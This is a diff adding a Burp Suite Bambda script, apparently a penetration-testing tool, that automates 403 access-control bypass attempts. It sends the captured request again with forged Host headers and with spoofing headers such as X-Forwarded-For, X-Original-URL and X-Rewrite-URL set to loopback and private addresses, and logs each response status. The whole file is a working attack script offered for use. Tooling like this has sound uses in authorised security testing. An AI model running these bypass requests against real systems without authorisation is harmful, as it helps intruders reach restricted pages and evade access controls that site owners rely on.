@@ -1,0 +1,103 @@
+// Advanced HTTP Attack Bambda Custom Action by zinja-coder@github
+// This Bambda performs 403 bypass attempts
+
+// Delay variable, Adjust as per requirement - 1000 = 1 second delay
+int GLOBAL_DELAY_MS = 200;
+
+// 403 Bypass Headers
+String[] BYPASS_HEADERS = {
+    "X-Forwarded-For",
+    "X-Real-IP", 
+    "X-Originating-IP",
+    "X-Forwarded-Host",
+    "X-Remote-IP",
+    "X-Remote-Addr",
+    "X-ProxyUser-Ip",
+    "X-Original-URL",
+    "X-Rewrite-URL",
+    "X-Forwarded-Proto",
+    "X-Forwarded-Scheme"
+};
+
+String[] BYPASS_IPS = {
+    "127.0.0.1",
+    "127...1",
+    "localhost",
+    "0.0.0.0",
+    "10.0.0.1",
+    "192.168.1.1",
+    "172.16.0.1"
+};
+
+// Get the original request
+var originalRequest = requestResponse.request();
+var httpService = requestResponse.httpService();
+var originalHeaders = originalRequest.headers();
+var originalBody = originalRequest.body();
+
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("ADVANCED HTTP ATTACK FUZZER STARTED");
+logging.logToOutput("Target: " + httpService.host() + ":" + httpService.port());
+logging.logToOutput("Original Method: " + originalRequest.method());
+logging.logToOutput("Original Path: " + originalRequest.path());
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("CHECK ORGANIZER TAB FOR OUTPUT");
+logging.logToOutput("[ ======================================= ]");
+
+int totalRequests = 0;
+
+// -------------------------- Test 4: Host Header Injection -------------------- //
+logging.logToOutput("[ === Testing Host Header Injection === ]");
+
+for (String hostPayload : BYPASS_IPS) {
+    try {
+        var hostRequest = originalRequest.withHeader("Host", hostPayload);
+        
+        var response = api.http().sendRequest(hostRequest);
+        Thread.sleep(GLOBAL_DELAY_MS);
+        
+        int status = response.response().statusCode();
+        String result = "Host Header Injection: " + hostPayload;
+        logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+        
+        var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(hostRequest, response.response());
+        requestResponseForOrganizer.annotations().setNotes(result);
+        api.organizer().sendToOrganizer(requestResponseForOrganizer);
+        totalRequests++;
+    } catch (Exception e) {
+        logging.logToError("Error with Host Header Injection: " + e.getMessage());
+    }
+}
+
+// -------------------------- Test 5: 403 Bypass Headers -------------------- //
+logging.logToOutput("[ === Testing 403 Bypass Headers === ]");
+
+for (String bypassHeader : BYPASS_HEADERS) {
+    for (String bypassIP : BYPASS_IPS) {
+        try {
+            var bypassRequest = originalRequest.withHeader(bypassHeader, bypassIP);
+            
+            var response = api.http().sendRequest(bypassRequest);
+            Thread.sleep(GLOBAL_DELAY_MS);
+            
+            int status = response.response().statusCode();
+            String result = "403 Bypass - " + bypassHeader + ": " + bypassIP;
+            logging.logToOutput("[ === " + result + " -> Status: " + status + " === ]");
+            
+            var requestResponseForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(bypassRequest, response.response());
+            requestResponseForOrganizer.annotations().setNotes(result);
+            api.organizer().sendToOrganizer(requestResponseForOrganizer);
+            totalRequests++;
+        } catch (Exception e) {
+            logging.logToError("Error with 403 Bypass: " + e.getMessage());
+        }
+    }
+}
+
+
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("[ === ADVANCED HTTP ATTACK FUZZING DONE === ]");    
+logging.logToOutput("[ ======================================= ]");
+logging.logToOutput("Total Requests Sent: " + totalRequests);
+logging.logToOutput("Check the Organizer tab for detailed results");
+logging.logToOutput("[ ======================================= ]");
